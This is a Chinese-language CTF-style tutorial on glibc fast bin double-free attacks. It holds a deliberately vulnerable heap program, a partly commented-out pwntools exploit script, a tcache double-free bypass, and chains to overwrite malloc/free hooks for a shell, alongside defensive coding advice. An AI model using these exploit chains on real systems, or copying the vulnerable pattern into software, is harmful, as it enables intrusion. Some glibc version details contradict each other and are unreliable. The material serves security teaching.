---
title: "Double Free攻击"
type: docs
weight: 5
---

## 案例五：堆利用入门——Fast Bin Attack

堆利用是二进制安全中最核心的攻击技术之一。与栈溢出不同，堆利用不依赖于覆盖返回地址，而是通过操纵堆管理器的内部数据结构来实现任意地址读写。Fast Bin Attack 是堆利用家族中最基础、最经典的攻击手法，掌握它是进入堆利用世界的第一步。

### 为什么需要学习堆利用

栈溢出利用在现代系统中面临重重防御：栈保护（Stack Canary）、地址随机化（ASLR）、不可执行栈（NX）。当这些保护同时启用时，纯栈溢出的利用难度急剧上升。堆利用提供了一条不同的攻击路径——它操纵的是堆管理器自身的元数据，而非程序的控制流栈帧。

堆利用的价值在于：

- **绕过栈保护**：不触及栈上的 Canary，无需泄露或绕过
- **构造任意读写原语**：通过精心布局，可以在任意地址分配 chunk 或读取内容
- **链式攻击**：一个堆漏洞可以串联多个后续漏洞，形成完整的利用链
- **适用性广**：malloc/free 是 C/C++ 程序的基础设施，几乎所有程序都使用堆

### Fast Bin 内部机制详解

要理解 Fast Bin Attack，必须先理解 glibc 堆管理器中 fast bin 的设计。

#### glibc 堆管理器的 Bin 分类

glibc 的 `ptmalloc2` 使用多种链表（bin）来管理空闲 chunk：

| Bin 类型 | 用途 | 大小范围 | 管理方式 |
|----------|------|----------|----------|
| Fast Bin | 快速分配小 chunk | 32~128 字节（64 位系统） | 单链表，LIFO，不合并 |
| Unsorted Bin | 回收站，中转 | 任意大小 | 双向链表，FIFO |
| Small Bin | 小 chunk 分配 | 128~1024 字节 | 双向链表，FIFO，按大小排序 |
| Large Bin | 大 chunk 分配 | >1024 字节 | 双向链表，按大小排序，可部分匹配 |

Fast Bin 的设计目标是**速度优先**。它有以下关键特性：

1. **LIFO（后进先出）**：最后释放的 chunk 会被最先分配出去
2. **不合并**：相邻的空闲 chunk 不会合并成更大的 chunk
3. **大小限制**：每个 fast bin 只管理特定大小的 chunk（64 位系统上以 16 字节为步长）
4. **数量限制**：默认最多 7 个 fast bin（管理 7 种不同大小的 chunk）
5. **检查最少**：相比其他 bin，fast bin 的安全检查最少

#### Fast Bin 的内存布局

Fast Bin 使用单链表管理空闲 chunk，每个 chunk 的 `fd`（forward）指针指向前一个空闲 chunk：

```text
fastbinsY[0] (size=0x30)
    ↓
┌──────────────┐
│  Chunk C     │ ← 最后释放（栈顶）
│  fd ─────────┼──→ ┌──────────────┐
│  size = 0x31 │    │  Chunk A     │ ← 最先释放（栈底）
└──────────────┘    │  fd = NULL   │
                    │  size = 0x31 │
                    └──────────────┘
```

关键字段说明：

- `fd`：只在 chunk 空闲时有意义，指向同一 bin 中下一个空闲 chunk
- `size`：chunk 的大小（包含 header，最低 3 位用于标志位）
- `prev_size`：在 fast bin 中通常为 0（因为不合并）

#### Fast Bin 的分配与释放流程

**释放流程（`free` → fast bin）：**

```c
// glibc 源码简化版 (malloc.c)
// 当 chunk 大小 <= fastbin_max_size 时进入 fast bin
if ((unsigned long)(size) <= (unsigned long)(get_max_fast())) {
    // 取该大小对应的 fast bin 索引
    idx = fastbin_index(chunksize(mchunkptr));
    
    // 取当前 fast bin 的头节点
    mchunkptr old = *fastbin(av, idx);
    
    // 检查：头节点不能是当前 chunk（Double Free 检查）
    // 注意：这个检查非常弱！只检查直接相邻的情况
    if (__builtin_expect(old == p, 0)) {
        errstr = "double free or corruption (fasttop)";
        goto errout;
    }
    
    // 检查：size 必须在 fast bin 范围内
    if (__builtin_expect(old != 0 && !ok_reuse(old, idx), 0)) {
        errstr = "invalid fastbin entry (free)";
        goto errout;
    }
    
    // 将 chunk 插入 fast bin 头部（LIFO）
    p->fd = old;      // 新 chunk 的 fd 指向旧头节点
    *fastbin(av, idx) = p;  // 更新头指针
}
```

**分配流程（`malloc` ← fast bin）：**

```c
// glibc 源码简化版
// 从对应大小的 fast bin 中取 chunk
idx = fastbin_index(nb);
fb = fastbin(av, idx);
mchunkptr old = *fb;  // 取头节点

if (old != NULL) {
    // 移除头节点
    mchunkptr next = old->fd;
    *fb = next;  // 更新头指针
    
    // 校验 size
    if (__builtin_expect(ok_reuse(old, idx), 1)) {
        return chunk2mem(old);  // 返回给用户
    }
}
```

### Double Free 漏洞原理

Double Free 是指对同一个 chunk 调用两次 `free()`。在 fast bin 的上下文中，这个漏洞特别危险。

#### 为什么 Double Free 可以成功

glibc 的 fast bin 有一个非常弱的 Double Free 检测：

```c
// 只检查 fast bin 的头节点是否等于当前 chunk
if (__builtin_expect(old == p, 0)) {
    errstr = "double free or corruption (fasttop)";
    goto errout;
}
```

这个检查**只验证当前 chunk 是否与 fast bin 链表的头节点相同**。如果在两次 free 之间夹一次其他 chunk 的 free，就可以绕过这个检查。

#### Double Free 的完整触发条件

成功触发 Double Free 需要满足以下条件：

1. **UAF 或悬垂指针**：释放后程序仍持有 chunk 的指针（没有置 NULL）
2. **绕过 fasttop 检查**：两次 free 之间需要插入一次对其他 chunk 的 free
3. **size 一致**：所有参与的 chunk 必须属于同一个 fast bin（大小相同）

#### Double Free 后的 Fast Bin 状态

正常情况下，两次 free 同一个 chunk 后，fast bin 形成环形链表：

```text
fastbinsY[0] → chunk_A → chunk_A → chunk_A → ...
                    ↑                        |
                    └────────────────────────┘
                        （环形链表）
```

这个环形链表是后续攻击的基础——两次 malloc 可以获得同一个地址，从而实现对同一块内存的双重控制。

### 漏洞目标程序

以下是一个典型的存在 Double Free 漏洞的堆管理程序：

```c
// heap_vuln.c - 简化的堆管理程序
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct Chunk {
    char data[64];
};

struct Chunk *chunks[10];

void alloc() {
    int idx;
    printf("索引: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= 10) return;
    chunks[idx] = (struct Chunk *)malloc(64);
    if (!chunks[idx]) return;
    printf("数据: ");
    read(0, chunks[idx]->data, 64);
}

void free_chunk() {
    int idx;
    printf("索引: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= 10) return;
    free(chunks[idx]);
    // 漏洞：没有将 chunks[idx] 置为 NULL
    // 导致悬垂指针，可以重复 free
}

void show() {
    int idx;
    printf("索引: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= 10) return;
    printf("数据: %s\n", chunks[idx]->data);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    printf("=== 堆管理器 v1.0 ===\n");
    while (1) {
        printf("1.分配 2.释放 3.查看 4.退出\n");
        int choice;
        scanf("%d", &choice);
        switch (choice) {
            case 1: alloc(); break;
            case 2: free_chunk(); break;
            case 3: show(); break;
            case 4: return 0;
        }
    }
}
```

#### 漏洞点分析

| 代码位置 | 漏洞类型 | 说明 |
|----------|----------|------|
| `free_chunk()` 第 38 行 | Use-After-Free (UAF) | `free()` 后未将 `chunks[idx]` 置 NULL |
| `free_chunk()` | Double Free | UAF + 缺少重复释放检测 → 可触发 Double Free |
| `show()` 第 47 行 | 信息泄露 | 通过 UAF 可读取已释放 chunk 的内容 |
| `alloc()` 第 30 行 | 数据覆盖 | 通过 UAF 可修改已释放 chunk 的 metadata |

### 编译与环境准备

```bash
# 编译目标程序（关闭所有保护，方便学习）
gcc -o heap_vuln heap_vuln.c \
    -no-pie \
    -fno-stack-protector \
    -z execstack \
    -z norelro \
    -g

# 确认保护状态
checksec heap_vuln
# [*] '/path/to/heap_vuln'
#     Arch:     amd64-64-little
#     RELRO:    No RELRO
#     Stack:    No canary found
#     NX:       NX disabled
#     PIE:      No PIE (0x400000)
#     RWX:      Has RWX segments

# 确认 glibc 版本（不同版本行为略有差异）
ldd heap_vuln | grep libc
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6

# 安装 pwntools（如未安装）
pip install pwntools
```

#### 关于编译选项的说明

- `-no-pie`：关闭地址随机化，程序加载基址固定为 `0x400000`，便于理解地址
- `-z execstack`：允许栈上执行，降低利用难度
- `-g`：包含调试信息，方便用 GDB 分析

在实际 CTF 比赛中，程序通常会开启 PIE 和 NX，利用难度会更高，需要额外泄露地址。

### 利用过程详解

Fast Bin Attack 的核心目标是：**通过 Double Free 构造环形链表，使得对同一内存区域拥有双重控制权，最终在任意地址分配 chunk**。

#### 完整攻击流程

```text
Step 1: 分配 chunk A 和 chunk B
Step 2: 释放 chunk A（进入 fast bin）
Step 3: 释放 chunk B（进入 fast bin，绕过 fasttop 检查）
Step 4: 释放 chunk A（Double Free！形成环形链表）
Step 5: malloc → 拿回 chunk A
Step 6: 覆写 chunk A 的 fd 指针为目标地址
Step 7: malloc → 拿回 chunk A（消耗环形中的一个）
Step 8: malloc → 拿回 chunk A（再次获得同一地址）
Step 9: malloc → 从修改后的 fd 指针分配，获得目标地址
```

每一步的内存状态变化如下：

```text
初始状态:
  fastbin[0x40] = NULL

Step 1 - malloc(A), malloc(B):
  A 地址: 0x602010, B 地址: 0x602050
  fastbin[0x40] = NULL

Step 2 - free(A):
  fastbin[0x40] → A(0x602010) → NULL

Step 3 - free(B):
  fastbin[0x40] → B(0x602050) → A(0x602010) → NULL

Step 4 - free(A): (Double Free，绕过检查因为 B 在 A 前面)
  fastbin[0x40] → A(0x602010) → B(0x602050) → A(0x602010) → 环形
  A->fd = B, B->fd = A  (形成环)

Step 5 - malloc: 拿到 A(0x602010)
  fastbin[0x40] → B(0x602050) → A(0x602010) → 环形

Step 6 - 覆写 A->fd = target_addr (如 0x602010 处的 __malloc_hook 地址)
  fastbin[0x40] → B(0x602050) → A(0x602010) → target_addr → ???

Step 7 - malloc: 拿到 B(0x602050)
  fastbin[0x40] → A(0x602010) → target_addr → ???

Step 8 - malloc: 拿到 A(0x602010)
  fastbin[0x40] → target_addr → ???

Step 9 - malloc: 拿到 target_addr！
  可以覆写目标地址的内容
```

#### 完整 Exploit 代码

```python
#!/usr/bin/env python3
"""
Fast Bin Attack - Double Free 完整利用脚本
目标：通过 Double Free 在 __malloc_hook 地址分配 chunk 并覆写为 one_gadget
"""
from pwn import *

# ============ 基本配置 ============
context.log_level = 'debug'
context.arch = 'amd64'

p = process('./heap_vuln')
elf = ELF('./heap_vuln')
libc = elf.libc

# ============ 交互函数 ============
def alloc(idx, data):
    """分配 chunk 并写入数据"""
    p.sendlineafter(b'退出', b'1')
    p.sendlineafter(b'索引: ', str(idx).encode())
    p.sendafter(b'数据: ', data)

def free_c(idx):
    """释放 chunk"""
    p.sendlineafter(b'退出', b'2')
    p.sendlineafter(b'索引: ', str(idx).encode())

def show(idx):
    """显示 chunk 内容（用于泄露地址）"""
    p.sendlineafter(b'退出', b'3')
    p.sendlineafter(b'索引: ', str(idx).encode())
    return p.recvline()

# ============ Step 1: Double Free 构造环形链表 ============
log.info("Step 1: 分配两个 chunk")
alloc(0, b'A' * 64)  # chunk 0 @ 0x602010 (假设地址)
alloc(1, b'B' * 64)  # chunk 1 @ 0x602050

log.info("Step 2: 释放 chunk 0")
free_c(0)  # fastbin → [0] → NULL

log.info("Step 3: 释放 chunk 1（插入到 chunk 0 前面，绕过 fasttop 检查）")
free_c(1)  # fastbin → [1] → [0] → NULL

log.info("Step 4: 再次释放 chunk 0（Double Free！）")
free_c(0)  # fastbin → [0] → [1] → [0] → 环形

# ============ Step 2: 利用 UAF 泄露堆地址（可选） ============
# 此时 chunk 0 的 fd 指向 chunk 1 的地址
# 通过 show(0) 可以读取 fd 字段，泄露堆地址
log.info("Step 5: 泄露堆地址")
leak_data = show(0)
# fd 字段在 data[0:8] 之后（chunk header 中 fd 在 data 之后 8 字节处）
# 注意：show 函数读取的是 data 区域，需要根据实际布局调整
# heap_addr = u64(leak_data[:8].ljust(8, b'\x00'))
# log.success(f"泄露的堆地址: {hex(heap_addr)}")

# ============ Step 3: 在 __malloc_hook 地址分配 chunk ============
# 64 位系统 fast bin 的 chunk size 为 0x40~0x80（含 header）
# 需要找到一个地址，该地址 + 8（跳过 size 字段）落在 __malloc_hook 附近
# 且 size 字段必须能伪造为合法的 fast bin size（如 0x7f）

# __malloc_hook 地址需要通过 libc 基址计算
# libc_base = heap_addr - offset  (需要泄露 libc 地址)
# __malloc_hook = libc_base + libc.sym['__malloc_hook']

# 在实际利用中，__malloc_hook 附近通常有残留的 0x7f 字节
# 可以伪造 size 为 0x7f（合法的 fast bin size）

# 这里演示概念，实际需要根据环境调整地址
log.info("Step 6: 分配 chunk（消耗环形中的一个节点）")
alloc(0, b'C' * 64)  # 从环形中取出 chunk 0

# 此时 chunk 0 的数据区域可被我们控制
# 我们可以覆写 fd 指针为目标地址
# target = __malloc_hook - 0x23  (偏移 0x23 处有 0x7f 可伪造 size)
# alloc(0, b'\x00' * 3 + p64(0) * 2 + p64(target))

log.info("Step 7: 分配 chunk（再次消耗环形）")
alloc(1, b'D' * 64)  # 取出 chunk 1

log.info("Step 8: 分配 chunk（消耗最后一个环形节点）")
alloc(0, b'E' * 64)  # 再次取出 chunk 0（环形效果）

# ============ Step 4: 覆写 __malloc_hook ============
# 现在再次 malloc 时，会从我们伪造的 fd 指针分配
# alloc(0, p64(one_gadget_addr))  # 覆写 __malloc_hook

# ============ Step 5: 触发 one_gadget ============
# p.sendlineafter(b'退出', b'1')
# p.sendlineafter(b'索引: ', b'5')
# p.sendlineafter(b'数据: ', b'X')  # 触发 malloc → __malloc_hook → one_gadget
# p.interactive()

log.success("利用流程演示完成")
log.info("实际利用需要：1) 泄露 libc 地址 2) 计算 __malloc_hook 3) 构造 one_gadget")
```

### 实际利用中的关键难点

#### 难点一：绕过 fasttop 检查

glibc 的 fast bin 只检查链表头节点，因此绕过方式很简单：

```text
free(A)  → fastbin: [A] → NULL
free(B)  → fastbin: [B] → [A] → NULL   ← B 插入到 A 前面
free(A)  → fastbin: [A] → [B] → [A] → 环形  ← A 不是头节点，绕过检查
```

**关键条件**：需要有至少两个相同大小的 chunk，且程序允许以任意顺序释放。

#### 难点二：伪造合法的 chunk size

在任意地址分配 chunk 时，fast bin 会检查该地址的 size 字段：

```c
if (__builtin_expect(old != 0 && !ok_reuse(old, idx), 0)) {
    errstr = "invalid fastbin entry (free)";
    goto errout;
}
```

`ok_reuse` 检查 size 是否在 fast bin 范围内（`<= fastbin_max_size`）且与当前 bin 的 size 匹配。

**解决方案**：

1. **利用 `__malloc_hook` 附近的 `0x7f` 字节**：`__malloc_hook` 前面通常有残留的 `0x7f` 字节（来自 `main_arena` 的 top chunk size），可以伪造为合法的 fast bin size `0x70`
2. **利用其他可控区域**：如果程序有全局数组或 .bss 段可控，可以在那里构造 fake chunk

```text
__malloc_hook 地址布局:
                    +0  +1  +2  +3  +4  +5  +6  +7
__malloc_hook-0x23: 00  00  00  00  00  00  00  7f  ← 可伪造 size = 0x70
__malloc_hook-0x1b: 00  00  00  00  00  00  00  00
...
__malloc_hook-0x08: XX  XX  XX  XX  XX  XX  XX  XX
__malloc_hook+0x00: HH  HH  HH  HH  HH  HH  HH  HH  ← 目标：覆写为 one_gadget
```

偏移 `-0x23` 处的 `0x7f` 可以被解释为 size 字段（`0x7f & 0xf0 = 0x70`，即 0x70 的 fast bin）。

#### 难点三：泄露 libc 基址

ASLR 开启后，libc 的加载地址是随机的，需要通过漏洞泄露：

1. **通过 Unsorted Bin 泄露**：释放一个大 chunk（进入 unsorted bin），其 fd/bk 指向 `main_arena` 中的地址，读取后减去偏移即可得到 libc 基址
2. **通过 GOT 表泄露**：如果程序有格式化字符串或 UAF 漏洞，可以读取 GOT 表中已解析的 libc 函数地址

### glibc 版本差异与 Tcache

#### Tcache 的引入（glibc 2.26+）

从 glibc 2.26 开始引入了 Tcache（Thread Local Cache），它会优先于 fast bin 处理小 chunk：

```text
分配优先级: Tcache > Fast Bin > Small Bin > Unsorted Bin
```

Tcache 的特点：
- 每个线程独立的缓存（减少锁竞争）
- 默认每个 tcache bin 最多 7 个 chunk
- 检查更少（glibc 2.26 的 Tcache 几乎没有 Double Free 检查）
- glibc 2.29+ 增加了 key 字段检测 Double Free

#### 不同版本的利用差异

| glibc 版本 | Fast Bin 检查 | Tcache | Double Free 难度 |
|-----------|---------------|--------|-----------------|
| 2.23 (Ubuntu 16.04) | 只检查 fasttop | 无 | 低 |
| 2.26 (Ubuntu 18.04) | 只检查 fasttop | 有，几乎无检查 | 低 |
| 2.27 (Ubuntu 18.04.1) | 只检查 fasttop | 有，key 字段检查 | 中 |
| 2.29+ (Ubuntu 19.04+) | 增强检查 | 有，完整检查 | 高 |
| 2.31+ (Ubuntu 20.04+) | 完整检查 | 有，完整检查 | 高 |

#### Tcache Double Free 绕过技巧

对于 glibc 2.27 的 Tcache key 检查：

```python
# 2.27 的 Tcache Double Free
# 需要在两次 free 之间覆写 tcache entry 的 key 字段
# key 字段位于 chunk 的 user data 区域偏移 8 字节处

alloc(0, b'A' * 64)
free_c(0)           # 进入 tcache，key = &tcache_perthread_struct
# 覆写 key 字段为非 tcache 结构地址
alloc(0, b'\x00' * 8)  # 清除 key 字段
free_c(0)           # 绕过 key 检查，Double Free 成功
```

### 实战技巧与经验总结

#### 堆布局规划

成功的堆利用需要精心规划 chunk 的分配和释放顺序：

```python
# 堆布局规划模板
# 1. 确定目标：要在哪个地址分配 chunk？
# 2. 确定 size：需要哪个 fast bin？
# 3. 确定链表：如何构造环形或链式结构？
# 4. 确定触发：什么时候触发任意分配？

# 示例布局：
# chunk_0: 0x60 大小，用于 Double Free
# chunk_1: 0x60 大小，用于绕过 fasttop 检查
# chunk_2: 0x60 大小，用于隔离 chunk（防止合并）
```

#### GDB 调试堆状态

使用 GDB + pwndbg/peda 查看堆状态：

```bash
# 安装 pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# 调试目标程序
gdb ./heap_vuln

# pwndbg 常用命令
pwndbg> heap            # 显示所有堆 chunk
pwndbg> bins            # 显示所有 bin 的状态
pwndbg> fastbins        # 显示 fast bin 链表
pwndbg> vis_heap_chunks # 可视化堆布局
pwndbg> telescope 0x602010 10  # 查看地址附近的值

# 在 free 前后设置断点，观察 fast bin 变化
b free
c
fastbins
```

#### 常见错误与调试

| 错误现象 | 可能原因 | 解决方法 |
|----------|----------|----------|
| `double free or corruption (fasttop)` | 两次 free 之间没有插入其他 chunk | 释放一个中间 chunk 绕过检查 |
| `invalid fastbin entry (free)` | chunk size 不在 fast bin 范围 | 检查 chunk 大小是否匹配 |
| `malloc(): memory corruption (fast)` | fast bin 链表被破坏 | 检查 fd 指针是否正确 |
| Segfault 在 malloc 时 | 分配到了非法地址 | 检查伪造的 size 字段 |
| Segfault 在 free 时 | chunk header 被破坏 | 确保 prev_size 和 size 正确 |

### 防御措施与安全编程

#### 编写安全的堆管理代码

```c
// 安全的 free 函数
void safe_free(void **ptr_array, int idx) {
    if (idx < 0 || idx >= MAX_SLOTS) return;
    if (ptr_array[idx] == NULL) return;  // 检查是否已释放
    free(ptr_array[idx]);
    ptr_array[idx] = NULL;  // 关键：释放后置 NULL，防止 UAF 和 Double Free
}

// 使用 calloc 代替 malloc（calloc 会清零，减少信息泄露风险）
void *safe_alloc(size_t size) {
    void *ptr = calloc(1, size);
    if (!ptr) {
        perror("calloc failed");
        exit(1);
    }
    return ptr;
}
```

#### 编译器和系统级防护

| 防护机制 | 作用 | 启用方式 |
|----------|------|----------|
| `FORTIFY_SOURCE` | 检测缓冲区溢出 | `-D_FORTIFY_SOURCE=2` |
| glibc `MALLOC_CHECK_` | 启用堆完整性检查 | `export MALLOC_CHECK_=3` |
| ASan (AddressSanitizer) | 检测 UAF、堆溢出 | `-fsanitize=address` |
| Safe-Linking (glibc 2.32) | 对 fast bin fd 指针加密 | 自动启用 |
| Tcache Key 检测 | 检测 Tcache Double Free | glibc 2.29+ 自动启用 |

#### 现代 glibc 的堆保护机制

**Safe-Linking（glibc 2.32+）**：对 fast bin 和 tcache 的 fd 指针进行加密：

```c
// 加密公式
#define PROTECT_PTR(pos, ptr) \
    ((__typeof(ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))

// 解密公式
#define REVEAL_PTR(ptr)  PROTECT_PTR(&ptr, ptr)
```

这使得直接覆写 fd 指针为任意地址变得困难，需要先泄露堆地址来计算正确的加密值。

### 进阶：从 Fast Bin Attack 到完整利用链

Fast Bin Attack 通常不是独立使用的，而是作为更大利用链的一环：

```text
信息泄露（泄露 libc 基址）
    ↓
Fast Bin Attack（在 __malloc_hook 分配 chunk）
    ↓
覆写 __malloc_hook 为 one_gadget
    ↓
触发 malloc → 执行 one_gadget → 获得 shell
```

另一种常见的利用链：

```text
UAF 泄露 heap 地址
    ↓
Fast Bin Attack 分配到 __free_hook
    ↓
覆写 __free_hook 为 system
    ↓
free("/bin/sh") → system("/bin/sh") → shell
```

### 相关技术扩展

Fast Bin Attack 是堆利用的入门技术，后续可以学习以下进阶技术：

| 技术 | 说明 | 适用场景 |
|------|------|----------|
| Unsorted Bin Attack | 向任意地址写入大值 | 修改全局变量 |
| Tcache Poisoning | Tcache 版的 Fast Bin Attack | glibc 2.26+ |
| House of Spirit | 在栈上伪造 chunk | 控制栈上的指针 |
| House of Force | 修改 top chunk 大小 | 覆盖后续分配 |
| House of Lore | 利用 small bin | 更复杂的攻击 |
| House of Orange | 不需要 free 的利用 | 无 free 函数时 |
| Large Bin Attack | 利用 large bin | 大 size chunk |

每种技术都有其适用场景和前提条件，实际利用时需要根据程序提供的漏洞类型和 glibc 版本选择合适的攻击手法。

### 练习建议

1. **环境搭建**：使用 Docker 或虚拟机搭建 glibc 2.23 环境，关闭所有保护
2. **GDB 跟踪**：每一步 malloc/free 都用 GDB 观察 fast bin 链表变化
3. **手写 Exploit**：不要直接复制代码，理解每一步的目的后自己编写
4. **更换 glibc 版本**：在不同 glibc 版本上测试同一漏洞，理解差异
5. **CTF 练习**：在 BUUCTF、攻防世界等平台找堆利用题目实战

***

*本文是堆利用系列的第一篇，后续将介绍 Unsorted Bin Attack、Tcache Poisoning 等进阶技术。*
